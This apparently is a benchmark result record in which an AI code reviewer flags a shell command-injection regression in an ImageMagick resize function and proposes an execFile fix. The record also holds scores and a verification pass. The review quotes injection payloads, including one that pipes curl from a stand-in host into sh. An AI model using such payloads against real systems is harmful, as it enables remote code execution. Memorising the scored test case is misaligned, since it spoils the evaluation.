@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 48.7,
+  "setup_seconds": 0.1,
+  "total_seconds": 48.7,
+  "usage": {
+    "in": 32251,
+    "cache_read": 121216,
+    "cache_write": 0,
+    "out": 2658,
+    "source": "cli"
+  },
+  "cost_usd": 0.1168148,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** `exec()` runs the command through a shell, and both `filter` (unquoted) and `src` (double-quoted only) are interpolated into the string. Any user-composed filter expression or path with shell metacharacters becomes arbitrary command execution on the host (e.g. `filter = \"Lanczos; id\"` or `src = 'a\"; id; echo \"'`).\n\n**Fix:** Keep `execFile` and pass `-filter` as a discrete argv entry. Validate `filter` against an allowlist of ImageMagick filter names if power users need a choice. A shell is not required for `-filter`.\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso restore `import { execFile } from \"child_process\";`."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Issue:** `resize(src, w)` becomes `resize(src, filter, w)`. Existing callers that still pass a numeric width as the second argument will coerce that number into `filter` and shift arguments, producing wrong ImageMagick invocations or runtime failures.\n\n**Fix:** Add `filter` as an optional last parameter (or an options object) with a safe default such as `\"Lanczos\"`, and keep argv-based `execFile` so the new argument cannot reach a shell."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change replaces safe `execFile` argv invocation with `child_process.exec` and interpolates caller-controlled `filter` and `src` into a shell command string, which is remote/local command injection.\n\n## Narrative\n\n`resize()` previously ran ImageMagick via `execFile(\"convert\", [src, \"-resize\", ...])`, which never invokes a shell. The PR switches to `exec(\\`convert \"${src}\" -filter ${filter} ...\\`)` and the comment states the filter is user-composed. That is exactly the failure mode: metacharacters in `filter` (unquoted) or `src` (only double-quoted) become shell syntax.\n\nConcrete examples:\n- `filter = \"Lanczos; curl evil.test | sh\"` runs an extra command\n- `src = 'x\"; id; echo \"'` breaks out of the quoted path\n\nImageMagick `-filter` takes a single filter name (or a fixed allowlist of names). It does not require a shell; pass it as a separate argv element with `execFile` / `execFileSync`.\n\nThe signature change (`resize(src, w)` \u2192 `resize(src, filter, w)`) is also a breaking API move for any downstream caller, secondary to the injection.\n\n**Recommendation:** request-changes\n",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code uses child_process.exec with a shell string that interpolates unquoted filter and only double-quoted src, so metacharacters in either parameter yield arbitrary command execution. Base used execFile with discrete argv and no filter, so this is a real critical RCE regression."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.756,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 6811,
+      "out": 435
+    },
+    "cost_usd": 0.016386
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
